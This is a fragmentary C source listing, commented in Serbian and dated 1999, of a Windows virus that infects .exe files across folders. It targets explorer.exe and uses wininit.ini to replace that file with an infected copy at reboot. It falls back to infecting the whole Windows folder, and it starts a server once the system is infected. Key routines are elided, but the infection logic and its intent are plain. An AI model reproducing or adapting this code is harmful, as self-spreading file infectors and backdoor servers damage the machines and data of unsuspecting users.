...
// ver 0.13 (21-may-1999): kada ne može explorer.exe onda ceo c:\windows!
...
// sadrži informacije o svakom inficiranom fajlu
//#define TESTMODE

// ako je definisan SKIP_C_DISK onda se C disk preskače prilikom inficiranja
//#define SKIP_C_DISK
...
/*
  ...
  + rekurzija, ali do određene granice.
  + brzina zaraze: prosečno oko 21 sekundu za 10 fajlova. */
...
void InfectFolder(char *folder) {
    ...
    do {
        ...
        if (FileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (INFECT_ALL==FALSE) continue;    // ako ne inficiraš sve podfoldere idi dalje
            fn=getfilename(path);
            ...
            if (fn==NULL) continue;                 // ako ext ne postoji izađi
            if (!lstrcmpi(fn, "exe")) {             // da li je .exe?
                ...
                if (filescount==10) {
                    filescount=0;
#ifndef TESTMODE
                    if (INFECT_ALL==TRUE) {             // ako inficiraš sve foldere
                        ix=GetTickCount() & 0x0F;       // slučajan broj od 0-15
...
/*
    InfectThread
    ------------
  + Thread koji zaražava ceo sistem. */
...
DWORD WINAPI InfectThread (LPVOID _d)
{
    ...
    *signature=0x4C;        // ispravi signature
    ...
    switch (IsFileInfect(explorer, signature))  // da li je explorer.exe zaražen?
    {
        case 0:         // NIJE INFICIRAN
            ...
            if (!InfectFile(ttemp)) {               // ako je uspešno inficiran...
                WritePrivateProfileString("Rename", explorer, ttemp, wininit);   // napravi 'wininit.ini' :)
            } else {                                // a ako nije uspešno inficiran
                DeleteFile(ttemp);                  // obriši kopirani fajl
                deep=strlengthF(explorer)-12;
                explorer[deep]=0;                   // nađi Windows folder
                INFECT_ALL=FALSE;                   // i samo njega
                InfectFolder(explorer);             // inficiraj
            }
            break;      // nastavi dalje!
        case -1:        // GREŠKA KOD ODREĐIVANJA DA LI JE INFICIRAN (?)
            SendMessage(hWnd, WM_DESTROY, 0, 0);    // završava posao
            return 0;   // izađi
    }
    ...
    // prvo startuj server, pošto se virus ne startuje prvi put
    // (tj. explorer.exe je zaražen)
    StartServer();
